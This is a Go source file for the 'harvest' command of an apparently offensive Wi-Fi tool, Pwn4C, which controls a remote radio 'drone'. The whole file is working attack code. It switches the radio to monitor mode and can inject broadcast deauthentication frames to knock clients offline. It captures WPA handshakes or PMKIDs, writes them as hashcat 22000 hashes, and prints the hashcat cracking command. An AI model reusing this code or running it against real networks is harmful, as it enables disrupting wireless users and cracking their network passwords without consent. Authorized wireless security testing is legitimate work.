package cmd

import (
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/3lyly0/Pwn4C/internal/drone"
	"github.com/spf13/cobra"
)

var (
	harvestBSSID   string
	harvestChannel int
	harvestTimeout int
	harvestOutput  string
	harvestAll     bool
	harvestTarget  string
	harvestDeauth  bool
	harvestClient  string
	harvestCount   int
)

var harvestCmd = &cobra.Command{
	Use:   "harvest [target_drone_ip]",
	Short: "Capture a crackable WPA handshake or PMKID and write hashcat 22000 output",
	Long: `Puts the drone radio on the target channel and waits for a 4-way handshake.

Unlike 'deauth --monitor' (which saves a PCAP and leaves the analysis to you),
harvest asks the daemon to decode EAPOL-Key frames in real time. As soon as an
AP message (M1/M3) and a client message (M2/M4) for the same (BSSID, STA) pair
have been seen — or an AP exposes a PMKID in M1 — the command writes a ready
hashcat line and exits:

  pwn4c harvest -b AA:BB:CC:DD:EE:FF -c 6 --timeout 180 -o hs.hc22000
  hashcat -m 22000 -a 0 hs.hc22000 wordlist.txt

Add --deauth to kick associated clients so they re-handshake immediately. The
daemon needs monitor mode on the same channel the AP uses; pass -c <channel>
or run 'pwn4c networks' first to find it.

Units whose ESSID has not been learned yet (no beacon captured) are skipped,
because hashcat 22000 requires the ESSID.`,
	Args: cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		target := harvestTarget
		if len(args) > 0 {
			target = args[0]
		}

		if harvestTimeout <= 0 {
			fmt.Println("[!] --timeout must be a positive number of seconds.")
			os.Exit(1)
		}
		if harvestChannel < 1 || harvestChannel > 13 {
			fmt.Println("[!] --channel must be between 1 and 13.")
			os.Exit(1)
		}
		if harvestDeauth && harvestBSSID == "" {
			fmt.Println("[!] --deauth needs the AP BSSID (-b).")
			os.Exit(1)
		}
		if harvestBSSID != "" {
			if hw, err := net.ParseMAC(harvestBSSID); err != nil || len(hw) != 6 {
				fmt.Printf("[!] Invalid BSSID %q (need 6 octets)\n", harvestBSSID)
				os.Exit(1)
			}
		}

		if target == "" {
			fmt.Println("[*] Searching for active Pwn4C drone...")
			drones, err := drone.Discover(2*time.Second, "")
			if err != nil || len(drones) == 0 {
				fmt.Println("[!] No drone discovered. Please specify drone IP directly.")
				os.Exit(1)
			}
			target = drones[0].IP
			fmt.Printf("[+] Discovered drone at %s\n", target)
		}

		fmt.Printf("[+] Connecting to drone at %s:%d...\n", target, drone.DefaultControlPort)
		client, err := drone.ConnectControl(target, 5*time.Second)
		if err != nil {
			fmt.Printf("[!] Failed to connect: %v\n", err)
			os.Exit(1)
		}
		defer client.Close()

		status, err := client.GetStatus()
		if err != nil {
			fmt.Printf("[!] Failed to query drone status: %v\n", err)
			os.Exit(1)
		}

		weStartedMonitor := false
		if !status.MonitorActive {
			fmt.Printf("[+] Activating monitor mode on channel %d...\n", harvestChannel)
			if err := client.StartMonitor(harvestChannel); err != nil {
				fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
				os.Exit(1)
			}
			weStartedMonitor = true
		} else if status.Channel != harvestChannel {
			fmt.Printf("[+] Switching channel from %d to %d...\n", status.Channel, harvestChannel)
			if err := client.SetChannel(harvestChannel); err != nil {
				fmt.Printf("[!] Failed to switch channel: %v\n", err)
				os.Exit(1)
			}
			// The session was already running; only clear the harvest table so
			// results reflect this run, not the previous one.
			if _, err := client.GetHandshakes(0, true); err != nil {
				fmt.Printf("[!] Warning: failed to reset the handshake table: %v\n", err)
			}
		} else {
			if _, err := client.GetHandshakes(0, true); err != nil {
				fmt.Printf("[!] Warning: failed to reset the handshake table: %v\n", err)
			}
		}

		// A BSSID filter from an earlier listen session survives a monitor
		// restart inside the daemon. Clear it so beacons from every AP are seen:
		// the ESSID is required to build the hashcat line.
		if err := client.SetFilter(false, ""); err != nil {
			fmt.Printf("[!] Warning: failed to clear the frame filter: %v\n", err)
		}

		if harvestDeauth {
			runHarvestDeauth(client, harvestBSSID, harvestClient,
				harvestChannel, harvestCount)
		}

		units := collectHandshakes(client, harvestChannel, harvestBSSID,
			harvestTimeout, harvestAll)
		stopHarvestMonitor(client, weStartedMonitor)

		if len(units) == 0 {
			fmt.Println("[!] No handshake captured.")
			printHarvestHints()
			os.Exit(1)
		}
		if err := writeHarvest(units, harvestOutput); err != nil {
			fmt.Printf("[!] %v\n", err)
			os.Exit(1)
		}
	},
}

// harvestKey identifies a unit across polls. A PMKID and a handshake from the
// same pair are different units: one cracks without the other.
func harvestKey(h drone.Handshake) string {
	if h.HasPMKID() {
		return h.BSSID + "|" + h.STA + "|pmkid|" + strings.ToLower(h.PMKID)
	}
	return h.BSSID + "|" + h.STA + "|mic|" + strings.ToLower(h.MIC)
}

// collectHandshakes polls the daemon until a unit is ready (or the deadline
// passes) and returns the deduplicated set. `bssid` filters host-side.
func collectHandshakes(client *drone.ControlClient, channel int, bssid string,
	timeout int, all bool) []drone.Handshake {
	var (
		units []drone.Handshake
		seen  = make(map[string]bool)
	)

	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
	fmt.Printf("[*] Listening on channel %d for up to %ds%s...\n",
		channel, timeout, harvestSuffix(bssid))

	for {
		page, err := client.GetAllHandshakes()
		if err != nil {
			fmt.Printf("\n[!] Failed to read handshakes: %v\n", err)
			break
		}

		for _, h := range page {
			if bssid != "" && !strings.EqualFold(h.BSSID, bssid) {
				continue
			}
			key := harvestKey(h)
			if seen[key] {
				continue
			}
			seen[key] = true
			units = append(units, h)
			fmt.Printf("[+] %s %s — %s (ssid=%q)\n",
				h.BSSID, h.STA, harvestKind(h), h.SSID)
		}

		if len(units) > 0 && !all {
			return units
		}
		if time.Now().After(deadline) {
			return units
		}
		time.Sleep(1 * time.Second)
	}

	return units
}

func harvestSuffix(bssid string) string {
	if bssid != "" {
		return " (filtering on " + bssid + ")"
	}
	return ""
}

func harvestKind(h drone.Handshake) string {
	if h.HasPMKID() {
		return "PMKID"
	}
	switch h.MessagePair {
	case 0:
		return "handshake M1+M2"
	case 1:
		return "handshake M1+M4"
	case 2:
		return "handshake M3+M2"
	case 3:
		return "handshake M3+M4"
	default:
		return "handshake"
	}
}

// printHarvestHints explains the usual reasons an empty table came back. The
// caller decides whether that is fatal (CLI) or just disappointing (shell).
func printHarvestHints() {
	fmt.Println("    Hints:")
	fmt.Println("      - confirm the AP is on this channel: pwn4c networks")
	fmt.Println("      - wait for a client to (re)associate, or use the deauth kick")
	fmt.Println("      - PMF/WPA3 networks never yield a classic 4-way handshake")
}

// writeHarvest renders every unit and writes the hashcat file. Units with an
// unknown ESSID cannot be cracked and are reported instead of written.
func writeHarvest(units []drone.Handshake, path string) error {
	if len(units) == 0 {
		return fmt.Errorf("no handshake captured")
	}

	var lines []string
	skipped := 0

	for _, h := range units {
		line, err := h.Hashcat22000()
		if err != nil {
			fmt.Printf("[!] Skipping %s / %s: %v\n", h.BSSID, h.STA, err)
			skipped++
			continue
		}
		lines = append(lines, line)
	}

	if len(lines) == 0 {
		return fmt.Errorf("captured %d unit(s) but none is usable (missing ESSID); "+
			"wait for a beacon from the AP or scan with 'pwn4c networks' first", skipped)
	}

	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0o644); err != nil {
		return fmt.Errorf("failed to write %s: %w", path, err)
	}

	fmt.Printf("[+] Wrote %d hash(es) to %s\n", len(lines), path)
	if skipped > 0 {
		fmt.Printf("    %d unit(s) skipped (unknown ESSID).\n", skipped)
	}
	fmt.Printf("\n    Crack with:\n      hashcat -m 22000 -a 0 %s wordlist.txt\n", path)
	return nil
}

// runHarvestDeauth injects a short burst so associated clients re-handshake.
func runHarvestDeauth(client *drone.ControlClient, bssid, clientMAC string, channel, count int) {
	opts := drone.DefaultFrameOptions()
	opts.Channel = channel

	frameHex, err := drone.BuildManagementFrame(bssid, clientMAC,
		drone.ReasonClass3FromNonAssocSTA, opts)
	if err != nil {
		fmt.Printf("[!] Warning: failed to build deauth frame: %v\n", err)
		return
	}

	fmt.Printf("[+] Injecting %d deauth frame(s) to trigger a re-handshake...\n", count)
	res, err := client.InjectFrame(frameHex, count, 10, 0)
	if err != nil {
		fmt.Printf("[!] Warning: deauth injection failed: %v\n", err)
		return
	}
	if res.Pending > 0 {
		if err := waitForTxDrain(client, 10*time.Second); err != nil {
			fmt.Printf("[!] Warning: lost contact during TX: %v\n", err)
		}
	}
}

// stopHarvestMonitor restores the radio only when this command started the
// monitor session, mirroring the rest of the CLI.
func stopHarvestMonitor(client *drone.ControlClient, weStarted bool) {
	if !weStarted {
		return
	}
	fmt.Println("[*] Stopping monitor mode...")
	if err := client.StopMonitor(); err != nil {
		fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
	}
}

func init() {
	harvestCmd.Flags().StringVarP(&harvestBSSID, "bssid", "b", "", "Only keep units from this AP BSSID")
	harvestCmd.Flags().IntVarP(&harvestChannel, "channel", "c", 1, "Wi-Fi channel of the target AP (1-13)")
	harvestCmd.Flags().IntVar(&harvestTimeout, "timeout", 180, "Give up after N seconds")
	harvestCmd.Flags().StringVarP(&harvestOutput, "out", "o", "hs.hc22000", "hashcat 22000 output file")
	harvestCmd.Flags().BoolVar(&harvestAll, "all", false, "Keep listening after the first unit until --timeout")
	harvestCmd.Flags().StringVarP(&harvestTarget, "target", "t", "", "Drone IP address")
	harvestCmd.Flags().BoolVar(&harvestDeauth, "deauth", false, "Send a deauth burst first to force clients to re-handshake")
	harvestCmd.Flags().StringVar(&harvestClient, "client", "ff:ff:ff:ff:ff:ff", "Client MAC for --deauth (default: broadcast)")
	harvestCmd.Flags().IntVarP(&harvestCount, "count", "n", 5, "Deauth frames to send with --deauth")

	rootCmd.AddCommand(harvestCmd)
}
